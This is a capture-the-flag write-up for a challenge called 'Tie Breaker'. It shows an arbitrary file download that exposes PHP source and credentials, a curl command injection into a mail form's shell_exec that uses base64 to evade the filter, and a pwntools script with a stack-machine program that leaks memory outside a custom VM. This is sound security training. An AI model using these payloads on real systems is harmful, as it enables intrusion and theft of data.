# Tie Breaker

>Bad sportsmanship, or good social engineering? - tchilders

## Challenge Description
`http://172.18.10.105:6530` good luck.

## Initial Observations
The initial website has links to two different web pages, `/bug_report/` and `mail.php`. bug_report gives some php errors about undefined index user and password. Let's try adding `?user=admin&password=password`.

## Bug Report
Adding the user and password gives us a "Bug Reporting System" Page. There is also a php error about undefined index file. There are three links on this page that all go to the `/bug_report/` endpoint with different `file=` parameters.

`VM_Capture.pcap`
`Payload.vm`
`PayloadDecompiler` - We were told later that this link was supposed to be `/PayloadDecompiler`.

It looks like this lets us download arbitrary files. Can we get some php source code?

`index.php`
```php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

include("../config.php");

if($_GET['user'] != $bug_user && $_GET['password'] != $bug_pass)
{
	die("You need to login to access this.");
}


if($_GET['file'])
{
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.$_GET['file'].'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length:' .filesize($_GET['file']));
	readfile($_GET['file']);
	exit;
}
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css">
  <link rel="stylesheet" href="https://static.pingendo.com/bootstrap/bootstrap-4.3.1.css">
</head>

<body>
  <div class="py-5">
    <div class="container">
      <div class="row">
        <div class="col-md-12">
          <h3 class="display-3 text-center">Secrets R Us - Bug Reporting System</h3>
        </div>
      </div>
    </div>
  </div>
  <div class="py-5" style="">
    <div class="container">
      <div class="row">
        <div class="col-md-12">
          <div class="card">
            <div class="card-header"> Ticket from XYZ, LLC - User was able to access secrets</div>
            <div class="card-body">
              <blockquote class="blockquote mb-0">
                <p></p>
                <p class="">Hello Secrets R Us Staff,<br>We deployed secrets in one of our VMs and sent it to a client of ours and while using it our client seems to have mis-read the VM documentation because they were able to leak secrets from outside of the VM memory.<br><br>Can you take a look at our VM and see what might be wrong I think we're running the latest version, we have attached a pcap of our default payload as well as our test payload.<br><br><br>Attached File: <a href="?file=/VM_Capture.pcap">VM_Capture.pcap</a><br>Attached File: <a href="?file=/Payload.vm">Payload.vm</a></p>
              </blockquote>
            </div>
          </div>
          <div class="card">
            <div class="card-header bg-warning"> Admin Response - User was able to access secrets</div>
            <div class="card-body bg-info">
              <h4></h4>
              <p class="lead bg-info" >Hello XYZ LLC,<br>This shouldn't be possible with our technology we assure you we are looking into this!<br><br>In the mean time can you have your client try this binary to create the payload they send to your VM and see if any issues occur?<br><br>Note to Admins: Please decompile the supplied payload using PayloadDecompiler<br>Attached File: <a href="?file=PayloadDecompiler">PayloadDecompiler</a></p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="py-5 text-center text-white h-100 align-items-center d-flex" style="background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url(&quot;https://static.pingendo.com/cover-bubble-dark.svg&quot;); background-position: center center, center center; background-size: cover, cover; background-repeat: repeat, repeat;"></div>
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</body>

</html>
```
Looks like this page will let us get any file we want from the server. There is a bug in the webpage that means you only need to get the user or password correct.

`../config.php`
```php
<?php
$bug_user = "admin";
$bug_pass = "b(_)gs";
?>
```
These are the debug creds for the bug_report webpage.

`../mail.php`
```php
<?php
if(array_key_exists("email",$_POST))
{
    if($_POST['email'])
    {
	echo "Sending email for news letter signup using mail command<br>";
        if(strstr($_POST['email'],"..") || strstr($_POST['email'],"/") || strstr($_POST['email'],"\\") )
        {
            die("Those characters aren't allowed in the email field.");
        }

        echo shell_exec("mail -s \"Welcome to our newsletter\" ".$_POST['email']);
    }
}
?>
```

## Email

The mail page causes a `shell_exec` call with the lightly filtered user input. We can avoid the filter by replacing `.` with `$(echo Lg== | base64 -d)` and `/` with `echo Lw== | base64 -d`. We can inject our own command to the email by adding a `|` to the end of the email and by echoing the command to get the output. Here's an example where we can run `ls /`.
```
$curl 'http://172.18.10.105:6530/mail.php' --data-raw 'email="a@a.com" | echo $(ls $(echo Lw== | base64 -d))'
Sending email for news letter signup using mail command<br>Payload.vm PayloadDecompiler VM_Capture.pcap bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var web-apps web-servers
```

We can try searching for some obvious flags using `find` but we won't fond anything. It seems like this might be a dead end.

## Packet Capture
Let's look at the pcap. It looks like there are a lot of requests to port 1025, some of the requests send some binary data and get back Fibonacci numbers. It will be important to notice that the after the sender is finished sending binary data, they send a FIN which closes their side of the TCP session.

## Decompilation

Let's look at the `Payload.vm` file. It looks like some kind of binary, probably run in some kind of custom VM. We can decompile the binary with the PayloadDecompiler utility and get the following output. 

```
$ ./PayloadDecompiler Payload.vm 
; File Payload.vm --- 380 bytes
0x0 PUSH 0xe0
0x8 JMP
0xc NOP
0x10 PUSH 0x2e ('.')
0x18 PUSH 0xc
0x20 STOR
0x24 POPIP
0x28 PUSH 0xc
0x30 LOAD
0x34 POPIP
0x38 PUSH 0x1
0x40 SWAP
0x44 SUB
0x48 POPIP
0x4c DUP
0x50 PUSH 0xc
0x58 STOR
0x5c POPIP
0x60 PUSHIP 0x74 ('t')
0x68 PUSH 0x28 ('(')
0x70 JMP
0x74 PUSHIP 0x88
0x7c PUSH 0x38 ('8')
0x84 JMP
0x88 PUSHIP 0x9c
0x90 PUSH 0x4c ('L')
0x98 JMP
0x9c POPIP
0xa0 DUP
0xa4 OUTNUM
0xa8 PUSH 0xa ('\n')
0xb0 OUT
0xb4 POPIP
0xb8 SWAP
0xbc DUP
0xc0 ROL3
0xc4 DUP
0xc8 ROL3
0xcc SWAP
0xd0 POPIP
0xd4 SWAP
0xd8 JNZ
0xdc POPIP
0xe0 PUSHIP 0xf4
0xe8 PUSH 0x10
0xf0 JMP
0xf4 PUSH 0x0
0xfc PUSHIP 0x110
0x104 PUSH 0xa0
0x10c JMP
0x110 PUSH 0x1
0x118 PUSHIP 0x12c
0x120 PUSH 0xb8
0x128 JMP
0x12c ADD
0x130 PUSHIP 0x144
0x138 PUSH 0xa0
0x140 JMP
0x144 PUSHIP 0x158
0x14c PUSH 0x60 ('`')
0x154 JMP
0x158 PUSH 0x118
0x160 PUSHIP 0x174
0x168 PUSH 0xd4
0x170 JMP
0x174 PUSH 0x17c
0x17c JMP
```

Some of the assembly stands out, `puship` and `popip` specifically. One of the first few hits on Google is `https://github.com/cslarsen/stack-machine` which looks promising. One of the example codes even outputs Fibonacci numbers. After cloning the repo we can use `make all check` to build the binaries and the example code. If we compare `stack-machine/tests/fib.sm` to the data sent in the pcap we will see that it is identical. It is also identical to the data in `Payload.vm`. Now let's try to get the code running on the server. 

We can use pwntools to start a TCP session with the server on 1025. Then we need to send the binary and close the send part of the session with the `shutdown('send')` function.

```python
from pwn import *

data = open("Payload.vm","rb").read()

con = remote('172.18.10.105', 1025)
con.send(data)
con.shutdown('send')
out=con.recvall()
print(out)
print(out.decode('ascii'))
```

```
$ python3.8 send.py
[+] Opening connection to 172.18.10.105 on port 1025: Done
[+] Receiving all data: Done (395B)
[*] Closed connection to 172.18.10.105 port 1025
b'== proof-of-work: disabled ==\nIntializing Secrets R Us Machine.\nLoading image from stdin...\nStarting VM\n0\n1\n2\n3\n5\n8\n13\n21\n34\n55\n89\n144\n233\n377\n610\n987\n1597\n2584\n4181\n6765\n10946\n17711\n28657\n46368\n75025\n121393\n196418\n317811\n514229\n832040\n1346269\n2178309\n3524578\n5702887\n9227465\n14930352\n24157817\n39088169\n63245986\n102334155\n165580141\n267914296\n433494437\n701408733\n1134903170\n1836311903\n2971215073\n'
== proof-of-work: disabled ==
Intializing Secrets R Us Machine.
Loading image from stdin...
Starting VM
0
1
2
3
5
8
13
21
34
55
89
144
233
377
610
987
1597
2584
4181
6765
10946
17711
28657
46368
75025
121393
196418
317811
514229
832040
1346269
2178309
3524578
5702887
9227465
14930352
24157817
39088169
63245986
102334155
165580141
267914296
433494437
701408733
1134903170
1836311903
2971215073
```

Now we can run code on the VM server. The `bug_report` page mentioned leaking secrets from outside of the VM memory so let's just try a bunch of `OUT` commands which will pop the stack and print the value as a uint8. Since we're printing bytes we'll remove the conversion to a string in the python code. 

`exploit.smc`
```
main:
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
halt
```

`send.py`
```python
from pwn import *

data = open("exploit.sm","rb").read()

con = remote('172.18.10.105', 1025)
con.send(data)
con.shutdown('send')
out=con.recvall()
print(out)
```
```
$ stack-machine/smc ./exploit.smc && python3.8 send.py
[+] Opening connection to 172.18.10.105 on port 1025: Done
[+] Receiving all data: Done (204B)
[*] Closed connection to 172.18.10.105 port 1025
b'== proof-of-work: disabled ==\nIntializing Secrets R Us Machine.\nLoading image from stdin...\nStarting VM\n\x00\x00\x00\nHGUONE RAF TON\n}nukst1{F \x00\x00\x00\nRAF OOT\n\x00\x06\x01]\x01\xa0\xfcx\xa4\xeb\xfc\x80\xfc0\x00 \xa4\xf1\xfc\x00\xfc0\x08\x00\xa4w\xfc\xe0\xa4\x80\xfc\xa0\xfc0\xa4 \xa4\xee\xfc\xc0\xfc0\xfc\xa0\xfc0\xfc\xa0\xfc\xa0\x00\x00\x00\xff\x00\x04\xfc\xf8\x00'
```
Some interesting output. `HGUONE RAF TON` reversed is `NOT FAR ENOUGH` and `RAF OOT` is `TOO FAR`. Between those two strings is `}nukst1{F` which reversed is `F{1tskun}`. This looks like it could be the flag, but it's missing some bytes. If the flag should begin with `RTXFLAG` we can see the pattern of missing bytes. 

```
(RTX)F
(LAG){
```

So the VM is popping four bytes but only outputting one byte. If we use `OUTNUM` it will output the entire 4 byte int. We can also add `32 OUT` to add spaces between the numbers. 

`exploit.smc`
```
main:
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  32 out
  32 out
  32 out
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  outnum
  32 out
  32 out
  32 out
  32 out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  out
  
halt
```

```
$ stack-machine/smc ./exploit.smc && python3.8 send.py
[+] Opening connection to 172.18.10.105 on port 1025: Done
[+] Receiving all data: Done (243B)
[*] Closed connection to 172.18.10.105 port 1025
b'== proof-of-work: disabled ==\nIntializing Secrets R Us Machine.\nLoading image from stdin...\nStarting VM\n\x00\x00\x00\nHGUONE RAF TON\n    125 1949392750 829906805 813260651 1664382067 1597204596 1600417329 1999860347 1195461702 1481921056 0    \x00\x00\nRAF OOT'
```

So our output bytes are `125 1949392750 829906805 813260651 1664382067 1597204596 1600417329 1999860347 1195461702 1481921056` we can put those numbers into a quick python script to convert them to one long hex string, then to ascii. 

```python
nums = "125 1949392750 829906805 813260651 1664382067 1597204596 1600417329 1999860347 1195461702 1481921056".split(' ')
nums = [int(a) for a in nums]
fullNum = 0
for num in nums:
  fullNum += num
  fullNum <<= 32
fullNum >>= 32
print(bytes.fromhex(hex(fullNum)[2:]).decode('ascii')[::-1])
```

`RTXFLAG{r3w1nd_th3_st4ck_y0u_w1n_1t}`
